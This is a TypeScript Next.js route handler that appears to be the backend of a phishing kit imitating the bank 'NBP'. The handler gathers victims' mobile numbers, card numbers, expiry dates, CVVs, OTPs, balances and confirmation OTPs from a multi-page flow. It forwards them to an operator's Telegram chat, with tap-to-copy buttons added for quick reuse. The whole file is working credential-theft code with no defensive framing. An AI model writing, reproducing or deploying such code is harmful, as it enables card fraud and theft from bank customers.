import { NextResponse } from 'next/server'

// Escape values for Telegram HTML parse mode
function escapeHtml(value: string) {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

// Wrap a value in <code> so it is tap-to-copy inside Telegram
function copyable(value: string | number) {
  return `<code>${escapeHtml(String(value))}</code>`
}

// Builds the cumulative message: whatever fields have been collected so far
// (across the login, card, otp, balance, and confirm-otp pages) are included,
// in a fixed order, so every step's notification contains all prior details.
// Also returns the raw field values so callers can build tap-to-copy buttons.
function buildCumulativeText(body: Record<string, unknown>) {
  const lines: string[] = ['<b>NBP submission update</b>']
  const copyFields: { label: string; value: string }[] = []

  const mobile = typeof body?.mobile === 'string' ? body.mobile.trim() : ''
  const card = typeof body?.card === 'string' ? body.card.trim() : ''
  const month = typeof body?.month === 'string' ? body.month.trim() : ''
  const year = typeof body?.year === 'string' ? body.year.trim() : ''
  const cvv = typeof body?.cvv === 'string' ? body.cvv.trim() : ''
  const otp = typeof body?.otp === 'string' ? body.otp.trim() : ''
  const balance = typeof body?.balance === 'string' ? body.balance.trim() : ''
  const confirmOtp = typeof body?.confirmOtp === 'string' ? body.confirmOtp.trim() : ''

  if (mobile) {
    lines.push(`Mobile: ${copyable(mobile)}`)
    copyFields.push({ label: 'Copy Mobile', value: mobile })
  }
  if (card) {
    lines.push(`Card: ${copyable(card)}`)
    copyFields.push({ label: 'Copy Card Number', value: card })
  }
  if (month || year) {
    const expiry = `${month || '--'}/${year || '----'}`
    lines.push(`Expiry: ${copyable(expiry)}`)
    copyFields.push({ label: 'Copy Expiry', value: expiry })
  }
  if (cvv) {
    lines.push(`CVV: ${copyable(cvv)}`)
    copyFields.push({ label: 'Copy CVV', value: cvv })
  }
  if (otp) {
    lines.push(`OTP: ${copyable(otp)}`)
    copyFields.push({ label: 'Copy OTP', value: otp })
  }
  if (balance) {
    lines.push(`Balance: ${copyable(`PKR ${balance}`)}`)
    copyFields.push({ label: 'Copy Balance', value: balance })
  }
  if (confirmOtp) {
    lines.push(`Confirm OTP: ${copyable(confirmOtp)}`)
    copyFields.push({ label: 'Copy Confirm OTP', value: confirmOtp })
  }

  return { text: lines.length > 1 ? lines.join('\n') : '', copyFields }
}

// Telegram's native "copy to clipboard" inline button (Bot API copy_text),
// arranged two per row like the reference design.
function buildCopyKeyboard(copyFields: { label: string; value: string }[]) {
  if (copyFields.length === 0) return undefined

  const buttons = copyFields.map(({ label, value }) => ({
    text: `✅ ${label}`,
    copy_text: { text: value },
  }))

  const rows: (typeof buttons)[] = []
  for (let i = 0; i < buttons.length; i += 2) {
    rows.push(buttons.slice(i, i + 2))
  }

  return { inline_keyboard: rows }
}

// The single configured bot/chat pair that notifications are delivered to.
function getTelegramTargets() {
  const targets: { token: string; chatId: string }[] = []

  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID
  if (token && chatId) targets.push({ token, chatId })

  return targets
}

export async function POST(request: Request) {
  const targets = getTelegramTargets()

  if (targets.length === 0) {
    return NextResponse.json({ ok: false, error: 'Telegram is not configured.' }, { status: 503 })
  }

  let text = ''
  let replyMarkup: ReturnType<typeof buildCopyKeyboard>
  try {
    const body = await request.json()

    const cumulative = buildCumulativeText(body ?? {})

    if (cumulative.text) {
      text = cumulative.text
      replyMarkup = buildCopyKeyboard(cumulative.copyFields)
    } else if (typeof body?.text === 'string' && body.text.trim()) {
      text = escapeHtml(body.text.trim())
    } else {
      const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
      const trimmed = value.trim()
      text = trimmed ? `New number submitted: ${copyable(trimmed)}` : ''
    }
  } catch {
    return NextResponse.json({ ok: false, error: 'Invalid request.' }, { status: 400 })
  }

  if (!text) {
    return NextResponse.json({ ok: false, error: 'Nothing to send.' }, { status: 400 })
  }

  const results = await Promise.allSettled(
    targets.map(({ token, chatId }) =>
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'HTML',
          ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
        }),
        cache: 'no-store',
      }),
    ),
  )

  const anySucceeded = results.some((result) => result.status === 'fulfilled' && result.value.ok)

  if (!anySucceeded) {
    return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
  }

  return NextResponse.json({ ok: true })
}

export function GET() {
  return NextResponse.json({ ok: false }, { status: 405 })
}
